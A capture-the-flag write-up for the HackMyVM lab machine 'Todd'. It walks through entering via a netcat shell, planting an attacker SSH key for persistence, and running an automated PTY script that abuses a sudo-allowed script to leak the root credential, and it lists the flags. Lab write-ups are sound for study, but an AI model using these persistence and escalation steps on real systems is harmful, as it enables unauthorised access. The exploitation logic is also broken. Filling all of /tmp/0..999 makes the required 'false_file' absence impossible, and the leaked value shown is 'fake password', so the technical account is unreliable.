# Todd-HMV: [Todd](https://hackmyvm.eu/machines/machine.php?vm=todd) 

> **Summary:** Nmap → identify suspicious netcat listener (7066) → stabilize access with auto-reconnect → add SSH key for persistence → sudo enumeration → analyze `guess_and_check.sh` via hint in `note.jpg` → exploit probabilistic `/tmp` file check to leak `/root/.cred` → SSH as root → read flags.

## Overview

**Goal:** Gain root on the *todd* machine.

**Attack path (high level):**
1. Nmap enumeration reveals multiple unusual ports and an unstable service on 7066.
2. Connect to 7066 via netcat; stabilize with an auto-reconnect script.
3. Add attacker SSH key to `~/.ssh/authorized_keys`, then SSH in normally as `todd`.
4. Enumerate sudo permissions; discover `NOPASSWD` access to `/srv/guess_and_check.sh`.
5. Extract a hint from `note.jpg` (`strings`) and trace the script with `bash -x`.
6. Exploit the script’s probabilistic `/tmp` file logic to leak `/root/.cred`.
7. SSH as `root` using the leaked password; retrieve root flag.

---

## Table of Contents
- [Overview](#overview)
- [1) Enumeration](#1-enumeration)
- [2) Initial access via port 7066](#2-initial-access-via-port-7066)
- [3) Persistence via SSH key](#3-persistence-via-ssh-key)
- [4) Sudo enumeration](#4-sudo-enumeration)
- [5) Script analysis: guess_and_check.sh](#5-script-analysis-guess_and_checksh)
- [6) Exploitation: `/tmp` file-state trick](#6-exploitation-tmp-file-state-trick)
- [7) Automating the human-check and leak](#7-automating-the-human-check-and-leak)
- [8) Root access](#8-root-access)
- [9) Flags](#9-flags)
- [10) Notes / Takeaways](#10-notes--takeaways)

---

## 1) Enumeration

Full TCP scan:

```zsh
└─$ cat scans/nmap/nmap-todd-full.log
# Nmap 7.98 scan initiated Fri Jan 23 17:32:58 2026 as:
# /usr/lib/nmap/nmap --privileged -v -p- -sC -sV -T4 -oA ... 10.60.60.11
Nmap scan report for todd.hmv (10.60.60.11)
Host is up (0.00014s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open  http       Apache httpd 2.4.59 ((Debian))
2569/tcp  open  tcpwrapped
2692/tcp  open  tcpwrapped
7066/tcp  open  unknown
9865/tcp  open  tcpwrapped
14327/tcp open  tcpwrapped
24242/tcp open  tcpwrapped
26528/tcp open  tcpwrapped
28543/tcp open  tcpwrapped
30455/tcp open  tcpwrapped
31126/tcp open  tcpwrapped
MAC Address: BC:24:11:50:95:70 (Proxmox Server Solutions GmbH)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Web enumeration (Feroxbuster) found a `/tools/` directory with common tooling but nothing directly exploitable:

```text
200 GET http://todd.hmv/
301 GET http://todd.hmv/tools => http://todd.hmv/tools/
200 GET http://todd.hmv/tools/les.sh
200 GET http://todd.hmv/tools/linpeas.sh
200 GET http://todd.hmv/tools/pspy64
200 GET http://todd.hmv/tools/fscan
```

---

## 2) Initial access via port 7066

Port **7066** behaved like an unstable netcat shell: connections would drop frequently. To keep reconnecting automatically, used the following script:

```python3
#!/usr/bin/env python3
import os, time

ip = "10.60.60.11"
port = 7066

while True:
    os.system("printf '\\a'")  # beep
    os.system("clear")
    print(f"[*] Connecting to {ip}:{port} ...")
    os.system(f"nc -nv {ip} {port}")
    print("[!] Dropped. Reconnecting in 1s...")
    time.sleep(1)
```

Once connected, id showed that we are user `todd`.

---

## 3) Persistence via SSH key

From the 7066 shell, added attacker public key for stable SSH access:

```zsh
mkdir -p ~/.ssh && chmod 700 ~/.ssh
sshid='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPpLy03xj5ofbRwDMCqxbJyU0GWRlSw2H4buQW+1iuSc cool@kali'
echo "$sshid" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

Then login normally:

```zsh
ssh todd@10.60.60.11
```

User flag:

```zsh
cat user.txt
Todd{eb93009a2719640de486c4f68daf62ec}
```

---

## 4) Sudo enumeration

```zsh
todd@todd:~$ sudo -l
Matching Defaults entries for todd on todd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User todd may run the following commands on todd:
    (ALL : ALL) NOPASSWD: /bin/bash /srv/guess_and_check.sh
    (ALL : ALL) NOPASSWD: /usr/bin/rm
    (ALL : ALL) NOPASSWD: /usr/sbin/reboot
```

---

## 5) Script analysis: guess_and_check.sh

In `/srv`, a `note.jpg` file contained a hint:

```zsh
todd@todd:/srv$ strings note.jpg
u can try bash -x guess_and_check.sh
```

View the script:

```zsh
cat /srv/guess_and_check.sh
```

```zsh
# check this script used by human
a=$((RANDOM%1000))
echo "Please Input [$a]"

echo "[+] Check this script used by human."
echo "[+] Please Input Correct Number:"
read -p ">>>" input_number

[[ $input_number -ne "$a" ]] && exit 1

sleep 0.2
true_file="/tmp/$((RANDOM%1000))"
sleep 1
false_file="/tmp/$((RANDOM%1000))"

[[ -f "$true_file" ]] && [[ ! -f "$false_file" ]] && cat /root/.cred || exit 2
```

Trace execution (useful to understand behavior):

```zsh
bash -x guess_and_check.sh
```

Observation:
- Sometimes `true_file` and `false_file` can be the **same path** (e.g. `/tmp/246` and `/tmp/246`). In that case the condition becomes logically impossible:
  - `[[ -f /tmp/246 ]] && [[ ! -f /tmp/246 ]]`
- When they are **different**, the condition is satisfiable, but depends on the presence/absence of the corresponding `/tmp/<n>` files.

---

## 6) Exploitation: `/tmp` file-state trick

To increase the chance of satisfying:

```zsh
[[ -f "$true_file" ]] && [[ ! -f "$false_file" ]]
```

Create a controlled split of numeric files in `/tmp`.

Create `/tmp/0..999` so `true_file` is more likely to exist while `false_file` is more likely to be absent:

```zsh
for i in $(seq 0 999); do : > /tmp/$i; done
```

Then repeatedly run:

```zsh
sudo /bin/bash /srv/guess_and_check.sh
```

When the file-state condition is met, the script prints `/root/.cred`.

---

## 7) Automating the human-check and leak

Because the script prompts for a number (`Please Input [NNN]`), a PTY-based Python helper can:
- parse the bracketed number
- send it automatically
- detect success by checking for **any output beyond the echoed input**

`auto_solve.py`:

```python
#!/usr/bin/env python3
import os, pty, re, select, sys, time

CMD = ["sudo", "/bin/bash", "/srv/guess_and_check.sh"]
NUM_RE = re.compile(r"Please Input \[(\d+)\]")

def run_once():
    pid, fd = pty.fork()
    if pid == 0:
        os.execvp(CMD[0], CMD)

    buf = ""
    sent = False
    number = None

    while True:
        r, _, _ = select.select([fd], [], [], 1)
        if fd in r:
            try:
                data = os.read(fd, 4096).decode(errors="ignore")
            except OSError:
                break
            if not data:
                break

            sys.stdout.write(data)
            sys.stdout.flush()
            buf += data

            if number is None:
                m = NUM_RE.search(buf)
                if m:
                    number = m.group(1)

            if number and (not sent) and ">>>" in buf:
                os.write(fd, (number + "\n").encode())
                sent = True

        try:
            if os.waitpid(pid, os.WNOHANG)[0] == pid:
                break
        except ChildProcessError:
            break

    # Extract output after prompt and remove echoed input
    if ">>>" not in buf or number is None:
        return False, number, ""

    post = buf.split(">>>", 1)[1].strip()
    lines = [ln.strip() for ln in post.splitlines() if ln.strip()]
    if lines and lines[0] == number:
        lines = lines[1:]

    real = "\n".join(lines).strip()
    return (real != ""), number, real

attempt = 0
while True:
    attempt += 1
    hit, n, real = run_once()

    if hit:
        print(f"\n[+] HIT on attempt {attempt} (input was {n})")
        print("----- real output -----")
        print(real)
        break

    print(f"\n[-] attempt {attempt} no output (input was {n}), retrying...")
    time.sleep(0.05)
```

Example successful output:

```text
[+] HIT on attempt 4 (input was 265)
----- real output -----
fake password
```

---

## 8) Root access

Use the leaked credential to SSH as root:

```zsh
ssh root@10.60.60.11
# password: (value printed from /root/.cred)
```

---

## 9) Flags

- **User:** `Todd{eb93009a2719640de486c4f68daf62ec}`
- **Root:** `Todd{389c9909b8d6a701217a45104de7aa21}`

---

## 10) Notes / Takeaways

- The unstable access on port **7066** was a netcat-based shell that frequently dropped connections.
- `strings` on `note.jpg` provided a key hint to debug the logic (`bash -x`).
- The script is probabilistic: when `true_file == false_file`, the final condition is impossible.
- Controlling `/tmp` file state dramatically increases the chance of hitting the satisfiable case.
- PTY-based automation is ideal for scripts using `read -p` prompts.
